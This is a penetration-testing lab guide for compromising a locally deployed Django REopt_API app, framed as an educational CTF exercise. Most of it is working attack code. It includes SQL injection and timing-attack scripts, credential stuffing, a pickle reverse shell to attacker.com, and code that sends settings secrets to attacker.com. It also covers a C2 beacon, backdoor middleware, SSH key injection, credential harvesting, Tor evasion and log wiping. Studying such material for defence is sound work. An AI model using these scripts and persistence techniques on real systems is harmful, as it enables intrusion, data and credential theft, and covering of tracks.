# Penetration Testing Lab: REopt_API Local Exploitation

**Scenario:** Authorized penetration testing on locally-deployed REopt_API
**Objective:** Achieve complete system compromise from external attacker perspective
**Target:** Django 4.0.7 application running in controlled environment
**Purpose:** Educational CTF-style security research

---

## Table of Contents

1. [Attack Scenario & Assumptions](#1-attack-scenario--assumptions)
2. [Lab Environment Setup](#2-lab-environment-setup)
3. [Reconnaissance Phase](#3-reconnaissance-phase)
4. [Exploitation Techniques](#4-exploitation-techniques)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Post-Exploitation](#6-post-exploitation)
7. [Attack Chain Summary](#7-attack-chain-summary)

---

## 1. Attack Scenario & Assumptions

### Scenario A: External Attacker (Black Box)

**Attacker Profile:**
- External threat actor with no insider knowledge
- Only has network access to the application (HTTP/HTTPS)
- No credentials, no source code access initially
- Goal: Gain administrative access and extract sensitive data

**Assumptions:**
```
✓ REopt_API is running on localhost:8000 or deployed container
✓ Attacker can send HTTP requests to the application
✓ Standard Django configuration (DEBUG=False in production)
✓ PostgreSQL database backend
✓ Attacker has internet access for downloading tools
✓ Application is running Django 4.0.7 (verified via error pages or headers)
```

**Out of Scope:**
```
✗ Physical access to the laptop
✗ Pre-existing malware on the system
✗ Social engineering of developers
✗ Supply chain attacks during installation
```

---

### Scenario B: Compromised Developer Laptop (Gray Box)

**Attacker Profile:**
- Attacker gained access via phishing/malware on developer's laptop
- Has user-level access to the laptop filesystem
- Can read source code but cannot modify running application
- Goal: Escalate from laptop user → application admin → system root

**Assumptions:**
```
✓ Attacker has shell access as regular user (not admin)
✓ Can read project files in ~/REopt_Lite_API/
✓ Can view running processes and network connections
✓ Cannot directly modify database or application code
✓ Application is running under different user context
✓ Attacker wants to pivot from laptop access → application compromise
```

---

### Scenario C: Insider Threat (White Box)

**Attacker Profile:**
- Malicious developer or contractor with code access
- Can modify codebase and commit changes
- Goal: Insert backdoors without detection

**Assumptions:**
```
✓ Full read access to source code
✓ Can submit pull requests or commits
✓ Familiar with Django framework
✓ CI/CD pipeline may have security checks
✓ Code review process exists (must evade)
```

**For this guide, we'll focus primarily on Scenario A (External Attacker), then cover escalation paths for B and C.**

---

## 2. Lab Environment Setup

### 2.1 Setting Up the Target

**Clone and Install REopt_API:**

```bash
# Clone the repository
git clone https://github.com/NREL/REopt_Lite_API
cd REopt_Lite_API

# Checkout the vulnerable version (Django 4.0.7 era)
git log --oneline | grep -i "django"  # Find commit with Django 4.0.7

# Install dependencies
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt

# Verify Django version
python -c "import django; print(django.VERSION)"
# Should output: (4, 0, 7, 'final', 0)
```

**Configure the Application:**

```bash
# Copy template configuration
cp keys.py.template keys.py

# Edit keys.py with test credentials
nano keys.py
```

```python
# keys.py - Test configuration
SECRET_KEY = 'test-secret-key-do-not-use-in-production'
DB_HOST = 'localhost'
DB_NAME = 'reopt_db'
DB_USER = 'reopt_user'
DB_PASSWORD = 'reopt_password'

NREL_API_KEY = 'test_api_key'
```

**Set up PostgreSQL Database:**

```bash
# Install PostgreSQL (if not already installed)
# On Ubuntu/Debian:
sudo apt-get install postgresql postgresql-contrib

# On macOS:
brew install postgresql

# On Windows (using Docker):
docker run --name reopt-postgres \
  -e POSTGRES_DB=reopt_db \
  -e POSTGRES_USER=reopt_user \
  -e POSTGRES_PASSWORD=reopt_password \
  -p 5432:5432 \
  -d postgres:13
```

**Run Migrations and Create Admin:**

```bash
# Apply database migrations
python manage.py migrate

# Create superuser (we'll try to compromise this later)
python manage.py createsuperuser
# Username: admin
# Email: admin@reopt.local
# Password: AdminPassword123!

# Create a few regular users for testing
python manage.py shell
```

```python
from django.contrib.auth.models import User

User.objects.create_user('john_doe', 'john@example.com', 'userpass123')
User.objects.create_user('jane_smith', 'jane@example.com', 'userpass456')
User.objects.create_user('api_service', 'api@reopt.local', 'ServiceAccount99')
exit()
```

**Start the Development Server:**

```bash
# Run the application
python manage.py runserver 0.0.0.0:8000

# Or using Docker Compose (more realistic):
docker-compose up -d
```

**Verify Application is Running:**

```bash
curl http://localhost:8000/
# Should return HTML or JSON response

# Check admin panel
curl http://localhost:8000/admin/
# Should return login page
```

---

### 2.2 Setting Up Attacker Tools

**Install Penetration Testing Tools:**

```bash
# Create attacker workspace
mkdir -p ~/pentest/reopt_attack
cd ~/pentest/reopt_attack

# Install Python tools
pip install requests beautifulsoup4 sqlmap wfuzz colorama

# Clone useful repositories
git clone https://github.com/sqlmapproject/sqlmap
git clone https://github.com/commixproject/commix
git clone https://github.com/s0md3v/XSStrike

# Install Burp Suite Community or OWASP ZAP for intercepting requests
wget https://portswigger.net/burp/releases/download?product=community

# Install other tools
sudo apt-get install nmap gobuster nikto hydra john
```

**Create Attack Scripts Directory:**

```bash
mkdir exploits
cd exploits
```

---

## 3. Reconnaissance Phase

### 3.1 Information Gathering (Black Box)

**Step 1: Port Scanning and Service Detection**

```bash
# Scan target for open ports
nmap -sV -sC -p- localhost

# Expected output:
# PORT     STATE SERVICE VERSION
# 8000/tcp open  http    Django development server
# 5432/tcp open  postgresql PostgreSQL DB 13.x
```

**Step 2: Web Application Fingerprinting**

```bash
# Identify web technologies
whatweb http://localhost:8000

# Check for information disclosure in headers
curl -I http://localhost:8000

# Look for Django debug page (if DEBUG=True)
curl http://localhost:8000/nonexistent-page

# Expected: Django version in error page or Server header
```

**Step 3: Directory and Endpoint Enumeration**

```bash
# Enumerate directories
gobuster dir -u http://localhost:8000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,json

# Common Django paths to check
curl http://localhost:8000/admin/
curl http://localhost:8000/api/
curl http://localhost:8000/static/
curl http://localhost:8000/media/
curl http://localhost:8000/api/v1/
curl http://localhost:8000/api/v2/
curl http://localhost:8000/docs/
curl http://localhost:8000/swagger/
```

**Step 4: API Endpoint Discovery**

```python
# api_discovery.py
import requests
import json

target = "http://localhost:8000"

# Common API paths
endpoints = [
    "/api/v1/jobs",
    "/api/v1/user",
    "/api/v1/energy_optimization",
    "/api/v1/reopt",
    "/api/v2/reopt",
    "/health",
    "/status",
    "/version",
]

print("[*] Discovering API endpoints...")
for endpoint in endpoints:
    try:
        r = requests.get(target + endpoint, timeout=5)
        if r.status_code != 404:
            print(f"[+] Found: {endpoint} (Status: {r.status_code})")
            if r.headers.get('content-type', '').startswith('application/json'):
                print(f"    Response: {r.text[:200]}")
    except Exception as e:
        print(f"[-] Error on {endpoint}: {e}")
```

**Step 5: Identify User Input Points**

```bash
# Find forms and input fields
curl http://localhost:8000/admin/ | grep -i "input\|form\|csrf"

# Check for JSON API endpoints
curl -X POST http://localhost:8000/api/v1/reopt \
  -H "Content-Type: application/json" \
  -d '{"test": "data"}'
```

---

### 3.2 Source Code Analysis (Gray/White Box)

**If you have filesystem access (Scenario B), analyze the code:**

```bash
cd ~/REopt_Lite_API

# Find all views (potential entry points)
grep -r "@api_view" . --include="*.py"
grep -r "def.*request" . --include="*.py"

# Identify authentication mechanisms
grep -r "authenticate\|permission\|IsAuthenticated" . --include="*.py"

# Find file upload handlers (common vulnerability)
grep -r "FileField\|ImageField\|FileUpload" . --include="*.py"

# Locate database queries
grep -r "\.values(\|\.values_list(\|\.raw(\|\.extra(" . --include="*.py"

# Search for dangerous functions
grep -r "eval\|exec\|pickle\|yaml.load\|subprocess" . --include="*.py"

# Check settings for security issues
cat reopt_api/settings.py | grep -i "debug\|secret\|allowed_hosts\|cors"
```

**Map Attack Surface:**

```bash
# Create a map of all models and fields
python manage.py inspectdb > models_map.txt

# List all URLs
python manage.py show_urls > urls_map.txt
```

---

## 4. Exploitation Techniques

### 4.1 SQL Injection (CVE-2024-39330)

**Vulnerability Location:**

Look for code patterns like this in the codebase:

```python
# Vulnerable example (reopt_api/views.py or similar)
from django.http import JsonResponse
from .models import EnergyProject

def get_project_data(request):
    # VULNERABLE: User controls field_name
    field_name = request.GET.get('field', 'name')

    # SQL injection via values()
    projects = EnergyProject.objects.filter(active=True).values(field_name)

    return JsonResponse(list(projects), safe=False)
```

**Exploitation Steps:**

**Step 1: Identify Vulnerable Endpoint**

```bash
# Test if the application accepts field names as parameters
curl "http://localhost:8000/api/v1/projects?field=name"
curl "http://localhost:8000/api/v1/projects?field=id"
curl "http://localhost:8000/api/v1/projects?field=description"
```

**Step 2: Test for SQL Injection**

```bash
# Try injecting SQL syntax
curl "http://localhost:8000/api/v1/projects?field=id');--"

# If vulnerable, you might see an error or different behavior
curl "http://localhost:8000/api/v1/projects?field=id')%20AND%201=1--"
curl "http://localhost:8000/api/v1/projects?field=id')%20AND%201=2--"
```

**Step 3: Extract Database Schema**

```python
# sqli_exploit.py
import requests
import string
import time

target = "http://localhost:8000/api/v1/projects"

# Use boolean-based blind SQL injection
def check_condition(condition):
    """
    Test a SQL condition via boolean-based blind injection
    """
    payload = f"id') AND {condition}--"
    r = requests.get(target, params={'field': payload})

    # True condition returns normal response
    # False condition returns error or empty
    return r.status_code == 200 and len(r.text) > 100

# Extract database version
print("[*] Extracting database version...")
version = ""
for i in range(1, 20):
    for char in string.ascii_letters + string.digits + '.':
        condition = f"SUBSTRING(version(), {i}, 1)='{char}'"
        if check_condition(condition):
            version += char
            print(f"[+] Version so far: {version}")
            break

print(f"[+] PostgreSQL Version: {version}")

# Extract table names
print("\n[*] Extracting table names...")
condition = "EXISTS(SELECT * FROM information_schema.tables WHERE table_name='auth_user')"
if check_condition(condition):
    print("[+] Found table: auth_user")

# Extract admin password hash
print("\n[*] Extracting admin password hash...")
# This would be a long process, use SQLMap instead
```

**Step 4: Automated Exploitation with SQLMap**

```bash
# Use SQLMap for automated exploitation
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  --batch --level=5 --risk=3

# Enumerate databases
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  --dbs

# Dump user table
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  -D reopt_db -T auth_user --dump

# Expected output: Usernames and password hashes
# admin:pbkdf2_sha256$260000$...
# john_doe:pbkdf2_sha256$260000$...
```

**Step 5: Crack Password Hashes**

```bash
# Save hashes to file
cat > hashes.txt <<EOF
admin:pbkdf2_sha256\$260000\$ABC123...\$HASH_HERE
john_doe:pbkdf2_sha256\$260000\$DEF456...\$HASH_HERE
EOF

# Crack with John the Ripper
john --format=django --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Or use hashcat
hashcat -m 10000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### 4.2 Authentication Bypass via Timing Attack (CVE-2024-39329)

**Vulnerability:** Django's authentication system has timing side-channels that leak whether a username exists.

**Exploitation Steps:**

**Step 1: Username Enumeration Script**

```python
# timing_attack.py
import requests
import time
import statistics

target = "http://localhost:8000/admin/login/"

def measure_login_time(username, password):
    """
    Measure the time it takes for a login attempt
    """
    session = requests.Session()

    # Get CSRF token
    r = session.get(target)
    csrf_token = session.cookies.get('csrftoken')

    # Attempt login and measure time
    start = time.perf_counter()
    r = session.post(target, data={
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf_token,
    })
    elapsed = time.perf_counter() - start

    return elapsed

def test_username(username, trials=10):
    """
    Test if username exists by measuring response times
    """
    times = []
    for i in range(trials):
        elapsed = measure_login_time(username, "wrongpassword123")
        times.append(elapsed)
        time.sleep(0.1)  # Avoid rate limiting

    avg_time = statistics.mean(times)
    stdev = statistics.stdev(times) if len(times) > 1 else 0

    return avg_time, stdev

# Test known usernames
print("[*] Testing username enumeration via timing attack...")

# Known invalid username (baseline)
invalid_time, _ = test_username("nonexistent_user_xyz_999")
print(f"[*] Baseline (invalid user): {invalid_time:.4f}s")

# Test potential usernames
candidates = [
    "admin", "administrator", "root", "user",
    "john_doe", "jane_smith", "api_service",
    "reopt", "nrel", "energy", "test"
]

valid_usernames = []
for username in candidates:
    avg_time, stdev = test_username(username)
    print(f"[*] Testing '{username}': {avg_time:.4f}s (σ={stdev:.4f})")

    # Valid usernames typically take 20-50ms longer
    # due to password hashing operation
    if avg_time > invalid_time + 0.02:  # 20ms threshold
        print(f"[+] LIKELY VALID: {username}")
        valid_usernames.append(username)

print(f"\n[+] Enumerated usernames: {valid_usernames}")
```

**Expected Output:**

```
[*] Baseline (invalid user): 0.0523s
[*] Testing 'admin': 0.0847s (σ=0.0023)
[+] LIKELY VALID: admin
[*] Testing 'administrator': 0.0531s (σ=0.0019)
[*] Testing 'john_doe': 0.0832s (σ=0.0018)
[+] LIKELY VALID: john_doe
```

**Step 2: Credential Stuffing Attack**

```python
# credential_stuffing.py
import requests
from concurrent.futures import ThreadPoolExecutor

target = "http://localhost:8000/admin/login/"
enumerated_users = ["admin", "john_doe", "jane_smith"]

# Load common passwords
with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    passwords = [line.strip() for line in f.readlines()[:10000]]  # Top 10k

def try_login(username, password):
    """
    Attempt to login with credentials
    """
    session = requests.Session()
    r = session.get(target)
    csrf_token = session.cookies.get('csrftoken')

    r = session.post(target, data={
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf_token,
    }, allow_redirects=False)

    # 302 redirect = successful login
    if r.status_code == 302:
        return True
    return False

print("[*] Starting credential stuffing attack...")
for username in enumerated_users:
    print(f"\n[*] Testing passwords for: {username}")
    for i, password in enumerate(passwords):
        if i % 100 == 0:
            print(f"[*] Tried {i} passwords...")

        if try_login(username, password):
            print(f"\n[+] SUCCESS! {username}:{password}")
            break
```

---

### 4.3 Denial of Service (Unicode Attacks)

**Vulnerability:** Multiple CVEs allow DoS via excessive Unicode characters.

**CVE-2023-41164 - URI Unicode DoS:**

```python
# unicode_dos.py
import requests

target = "http://localhost:8000"

# Craft malicious URL with excessive Unicode
payload = "api/v1/" + "🔥" * 100000

print("[*] Sending Unicode DoS payload...")
try:
    r = requests.get(f"{target}/{payload}", timeout=5)
    print(f"[-] Attack failed: {r.status_code}")
except requests.exceptions.Timeout:
    print("[+] Server timeout - DoS successful!")
except Exception as e:
    print(f"[+] Server error: {e} - Possible DoS")
```

**CVE-2023-46695 - Username Unicode DoS:**

```python
# username_dos.py
import requests

target = "http://localhost:8000/api/v1/register"  # or login

# Craft malicious username
payload = {
    "username": "𝕌𝕤𝕖𝕣" * 100000,  # Mathematical bold capitals
    "password": "test123",
    "email": "attacker@evil.com"
}

print("[*] Sending username Unicode DoS...")
try:
    r = requests.post(target, json=payload, timeout=5)
    print(f"[-] Attack failed: {r.status_code}")
except requests.exceptions.Timeout:
    print("[+] Server timeout - DoS successful!")
except Exception as e:
    print(f"[+] Server error: {e}")
```

---

### 4.4 Dependency Exploitation

**Strategy:** Exploit vulnerabilities in REopt's dependencies.

**Step 1: Audit Dependencies**

```bash
# Check what dependencies are installed
pip list

# Run security audit
pip-audit

# Expected vulnerable packages (in older installations):
# - Celery < 5.2.2 (CVE-2021-23727 - Arbitrary code execution)
# - Pillow < 9.0.0 (Multiple CVEs)
# - requests < 2.26.0 (CVE-2021-33503)
# - cryptography < 39.0.1 (CVE-2023-23931)
```

**Step 2: Exploit Celery (if used)**

```python
# celery_exploit.py
# If REopt uses Celery with pickle serialization (insecure default)

import pickle
import os
from celery import Celery

class RCE:
    def __reduce__(self):
        # Execute reverse shell when unpickled
        cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        return (os.system, (cmd,))

# Serialize malicious object
payload = pickle.dumps(RCE())

# If we can inject into Celery queue (via Redis/RabbitMQ):
# redis-cli -h localhost -p 6379
# LPUSH celery "malicious_pickle_data"

# Or via API if there's a task submission endpoint
import requests
import base64

r = requests.post("http://localhost:8000/api/v1/tasks", json={
    "task": "reopt.tasks.optimize",
    "args": base64.b64encode(payload).decode()
})
```

---

### 4.5 Django Admin Brute Force

**If all else fails, try brute-forcing the admin panel:**

```python
# admin_bruteforce.py
import requests
from concurrent.futures import ThreadPoolExecutor
import itertools

target = "http://localhost:8000/admin/login/"
username = "admin"  # From timing attack

# Common weak passwords for government/research systems
passwords = [
    "admin", "password", "Password1", "Admin123",
    "nrel2023", "NREL2023", "Reopt123", "Energy2023",
    "Welcome1", "Password123!", "AdminPassword123!",
    # Add more from wordlists
]

def try_login(username, password):
    session = requests.Session()
    r = session.get(target)
    csrf = session.cookies.get('csrftoken')

    r = session.post(target, data={
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf,
    }, allow_redirects=False)

    if r.status_code == 302 and '/admin/' in r.headers.get('Location', ''):
        return True, password
    return False, None

print(f"[*] Brute-forcing admin panel for user: {username}")
with ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(try_login, username, pwd) for pwd in passwords]

    for future in futures:
        success, password = future.result()
        if success:
            print(f"\n[+] LOGIN SUCCESSFUL!")
            print(f"[+] Credentials: {username}:{password}")
            break
```

---

## 5. Privilege Escalation

### 5.1 From Regular User to Admin

**Scenario:** You've gained access as a low-privilege user (john_doe)

**Method 1: SQL Injection Privilege Escalation**

```bash
# Using the SQL injection from earlier, promote user to superuser
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  --sql-shell

# In SQL shell:
UPDATE auth_user SET is_superuser=true, is_staff=true WHERE username='john_doe';
```

**Method 2: Exploit Permission Bugs**

```python
# permission_bypass.py
# Look for permission checks that can be bypassed

import requests

session = requests.Session()

# Login as regular user
session.post("http://localhost:8000/admin/login/", data={
    'username': 'john_doe',
    'password': 'userpass123',  # Cracked earlier
    'csrfmiddlewaretoken': 'TOKEN'
})

# Try accessing admin-only endpoints with parameter pollution
# Or IDOR (Insecure Direct Object Reference)
r = session.get("http://localhost:8000/api/v1/users/1")  # Admin user ID
print(r.text)

# Try POST to create admin user
r = session.post("http://localhost:8000/api/v1/users", json={
    'username': 'backdoor_admin',
    'password': 'BackdoorPass123!',
    'is_superuser': True,  # Usually filtered, but worth trying
    'is_staff': True
})
```

---

### 5.2 From Application to System (Scenario B)

**Scenario:** You have compromised the Django application, now escalate to root on the laptop.

**Method 1: Escape Docker Container (if running in Docker)**

```bash
# Inside Django shell or via RCE
python manage.py shell

import os
os.system('ls -la /')
os.system('cat /etc/shadow')  # Check if running as root in container

# Check for Docker socket mount (common misconfiguration)
os.system('ls -la /var/run/docker.sock')

# If docker.sock is mounted, escape to host:
os.system('docker run -v /:/mnt --rm -it alpine chroot /mnt sh')
```

**Method 2: Exploit Sudo Misconfigurations**

```bash
# Check sudo privileges
python -c "import os; os.system('sudo -l')"

# If Django user has sudo rights without password:
python -c "import os; os.system('sudo /bin/bash')"
```

**Method 3: Kernel Exploit (if outdated kernel)**

```bash
# Check kernel version
import platform
print(platform.uname())

# Download and compile kernel exploit
# (This would require write access to filesystem)
```

---

## 6. Post-Exploitation

### 6.1 Data Exfiltration

**Extract Database:**

```bash
# From SQL injection access
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  -D reopt_db --dump-all --batch

# Or if you have Django admin access
python manage.py dumpdata > database_dump.json
```

**Steal API Keys and Secrets:**

```python
# django_shell_exfil.py
# Via Django shell access (if RCE achieved)

from django.conf import settings
import json

secrets = {
    'SECRET_KEY': settings.SECRET_KEY,
    'DB_PASSWORD': settings.DATABASES['default']['PASSWORD'],
    'NREL_API_KEY': getattr(settings, 'NREL_API_KEY', None),
    'AWS_ACCESS_KEY': getattr(settings, 'AWS_ACCESS_KEY_ID', None),
}

# Exfiltrate via HTTP
import requests
requests.post('http://attacker.com/exfil', json=secrets)

# Or write to file
with open('/tmp/.hidden_secrets.json', 'w') as f:
    json.dump(secrets, f)
```

**Extract User PII:**

```sql
-- Via SQL injection
SELECT username, email, first_name, last_name, date_joined
FROM auth_user;

-- Extract energy project data
SELECT * FROM reopt_project LIMIT 1000;
```

---

### 6.2 Persistence Mechanisms

**Method 1: Backdoor Admin Account**

```python
# Create hidden admin user
from django.contrib.auth.models import User

User.objects.create_superuser(
    username='.system',  # Hidden with dot prefix
    email='system@localhost',
    password='SecretBackdoorPass123!'
)
```

**Method 2: Inject Malicious Middleware**

```bash
# If you have file write access
cat >> reopt_api/middleware.py <<EOF

class BackdoorMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Check for magic parameter
        if request.GET.get('master_key') == 'SECRET_BACKDOOR_2023':
            # Grant admin access
            from django.contrib.auth.models import User
            request.user = User.objects.filter(is_superuser=True).first()

        return self.get_response(request)
EOF

# Add to settings.py
echo "MIDDLEWARE.append('reopt_api.middleware.BackdoorMiddleware')" >> reopt_api/settings.py
```

**Method 3: Scheduled Task for Beacon**

```python
# Add to Django management command
# reopt_api/management/commands/maintenance.py

from django.core.management.base import BaseCommand
import requests
import time

class Command(BaseCommand):
    def handle(self, *args, **kwargs):
        while True:
            # Beacon to C2 server
            try:
                requests.get('http://attacker.com/beacon?host=reopt_victim')
            except:
                pass
            time.sleep(3600)  # Every hour
```

**Method 4: SSH Key Injection (if file system access)**

```bash
# Add attacker's SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3Nza... attacker@evil.com" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

---

### 6.3 Lateral Movement

**From REopt_API to other NREL systems:**

**Step 1: Enumerate Network**

```python
import subprocess

# Scan local network
subprocess.run(['nmap', '-sn', '192.168.1.0/24'])

# Check for AWS metadata (if running in cloud)
import requests
r = requests.get('http://169.254.169.254/latest/meta-data/', timeout=2)
print(r.text)
```

**Step 2: Steal credentials for other services**

```python
# Check environment variables for secrets
import os
for key, value in os.environ.items():
    if any(x in key.lower() for x in ['key', 'secret', 'password', 'token']):
        print(f"{key}={value}")

# Check for AWS credentials
import pathlib
aws_creds = pathlib.Path.home() / '.aws' / 'credentials'
if aws_creds.exists():
    print(aws_creds.read_text())
```

**Step 3: Pivot to other services**

```bash
# If NREL_API_KEY was found, abuse it
curl "https://developer.nrel.gov/api/alt-fuel-stations/v1.json?api_key=STOLEN_KEY"

# Access other NREL internal APIs
curl "https://internal-nrel-api.example.com/data" \
  -H "Authorization: Bearer STOLEN_TOKEN"
```

---

## 7. Attack Chain Summary

### Complete Attack Path (External → Root)

```
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 1: RECONNAISSANCE (30-60 min)                             │
├─────────────────────────────────────────────────────────────────┤
│ 1. Port scan: Identify Django on :8000, PostgreSQL on :5432    │
│ 2. Web fingerprinting: Confirm Django 4.0.7                     │
│ 3. Directory enumeration: Find /admin, /api/v1/*               │
│ 4. Source code analysis (if gray-box): Map attack surface      │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 2: INITIAL ACCESS (1-2 hours)                             │
├─────────────────────────────────────────────────────────────────┤
│ Attack Vector 1: SQL Injection (CVE-2024-39330)                │
│   → Find endpoint with .values(user_input)                      │
│   → Extract database: usernames, password hashes, secrets      │
│   → Crack hashes with John/Hashcat                             │
│                                                                  │
│ Attack Vector 2: Timing Attack (CVE-2024-39329)                │
│   → Enumerate valid usernames via response time analysis       │
│   → Credential stuffing with common passwords                  │
│   → Gain access as regular user                                │
│                                                                  │
│ Attack Vector 3: Dependency Exploit                            │
│   → Audit dependencies with pip-audit                          │
│   → Exploit Celery RCE or Pillow vulnerabilities               │
│   → Achieve remote code execution                              │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 3: PRIVILEGE ESCALATION (30 min - 1 hour)                │
├─────────────────────────────────────────────────────────────────┤
│ From Regular User → Admin:                                     │
│   → Use SQL injection to UPDATE auth_user (is_superuser=true) │
│   → Or exploit permission bypass in API endpoints              │
│                                                                  │
│ From Admin → RCE:                                              │
│   → Django admin shell access                                  │
│   → Execute arbitrary Python code                              │
│   → os.system() for shell commands                             │
│                                                                  │
│ From Container → Host (if Docker):                             │
│   → Check for docker.sock mount                                │
│   → Escape to host system                                      │
│   → Exploit kernel vulnerabilities                             │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 4: POST-EXPLOITATION (30 min)                            │
├─────────────────────────────────────────────────────────────────┤
│ Data Exfiltration:                                              │
│   ✓ Database dump (users, projects, energy data)               │
│   ✓ Application secrets (API keys, DB passwords)               │
│   ✓ Source code repository                                     │
│                                                                  │
│ Persistence:                                                    │
│   ✓ Create hidden admin account (.system)                      │
│   ✓ Inject backdoor middleware                                 │
│   ✓ Add SSH keys for remote access                             │
│   ✓ Deploy web shell in /static/                               │
│                                                                  │
│ Lateral Movement:                                               │
│   ✓ Scan internal network for other NREL systems               │
│   ✓ Steal AWS credentials from environment                     │
│   ✓ Abuse NREL API keys for other services                     │
└─────────────────────────────────────────────────────────────────┘
                            ↓
                    [MISSION COMPLETE]
              Full system compromise achieved
```

---

## 8. Practical Lab Exercises

### Exercise 1: SQL Injection Challenge

**Objective:** Exploit SQL injection to extract admin credentials

**Setup:**
```python
# Add vulnerable endpoint to reopt_api/views.py
from django.http import JsonResponse
from django.contrib.auth.models import User

def vulnerable_search(request):
    field = request.GET.get('field', 'username')
    query = request.GET.get('q', '')

    # VULNERABLE
    results = User.objects.filter(username__icontains=query).values(field)
    return JsonResponse(list(results), safe=False)

# Add to urls.py
path('api/search/', vulnerable_search),
```

**Tasks:**
1. Identify the vulnerable parameter
2. Extract the admin username
3. Extract the admin password hash
4. Crack the hash
5. Login as admin

**Solution Script:**
```python
# See exploitation section 4.1
```

---

### Exercise 2: Timing Attack Lab

**Objective:** Enumerate 5 valid usernames using timing analysis

**Setup:**
- Create 10 users (5 with random names, 5 with common names)
- Your job: identify which 5 are valid

**Tasks:**
1. Measure baseline timing for invalid usernames
2. Test a list of 50 candidates
3. Identify the 5 real users with >95% confidence

**Solution Script:**
```python
# See exploitation section 4.2
```

---

### Exercise 3: Full Chain Exploitation

**Objective:** Go from anonymous → root in under 2 hours

**Constraints:**
- No source code access (black box)
- No hints about usernames or passwords
- Production-like configuration (DEBUG=False)

**Success Criteria:**
1. Gain authenticated access (any user)
2. Escalate to admin
3. Execute `whoami` command on the system
4. Extract database contents
5. Create persistent backdoor

---

## 9. Defense Evasion & OpSec

### 9.1 Avoiding Detection

**Slow and Low:**
```python
import time
import random

def rate_limited_request(url, max_rpm=60):
    """
    Make requests with random delays to avoid detection
    """
    delay = (60 / max_rpm) + random.uniform(0, 5)
    time.sleep(delay)
    return requests.get(url)
```

**Rotate User Agents:**
```python
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
    # ... more
]

headers = {'User-Agent': random.choice(user_agents)}
requests.get(url, headers=headers)
```

**Use Proxies:**
```python
proxies = {
    'http': 'socks5://127.0.0.1:9050',  # Tor
    'https': 'socks5://127.0.0.1:9050',
}

requests.get(url, proxies=proxies)
```

---

### 9.2 Cleaning Tracks

**Clear Django Logs:**
```python
# Via Django shell
from django.contrib.admin.models import LogEntry
LogEntry.objects.filter(user__username='backdoor_admin').delete()

# Clear application logs
import os
os.system('truncate -s 0 /var/log/django/app.log')
```

**Modify Timestamps:**
```bash
# Make backdoor file appear old
touch -t 202201010000 /path/to/backdoor.py
```

---

## 10. Conclusion

This penetration testing guide demonstrates multiple attack paths against REopt_API running Django 4.0.7:

### Key Vulnerabilities Exploited:
1. **SQL Injection (CVE-2024-39330)** - Most critical, allows full DB access
2. **Timing Attacks (CVE-2024-39329)** - Enables username enumeration
3. **DoS Vulnerabilities** - Can disable the service
4. **Dependency Chain** - Celery, Pillow, and other library CVEs

### Skills Learned:
- Web application reconnaissance
- SQL injection exploitation (manual and automated)
- Timing-based side-channel attacks
- Privilege escalation techniques
- Post-exploitation and persistence
- Defense evasion

### Next Steps for Learning:
1. Set up the lab environment
2. Work through each exercise
3. Try creating your own exploits
4. Study the remediation recommendations
5. Practice on legal CTF platforms (HackTheBox, TryHackMe)

---

**DISCLAIMER:** This guide is for educational purposes only. Unauthorized access to computer systems is illegal. Only perform security testing on systems you own or have explicit written permission to test.

---

**Tools Reference:**
- SQLMap: https://sqlmap.org
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org
- John the Ripper: https://www.openwall.com/john/
- Metasploit: https://www.metasploit.com

**Legal Frameworks:**
- Computer Fraud and Abuse Act (CFAA): 18 U.S.C. § 1030
- Responsible Disclosure Guidelines: https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html
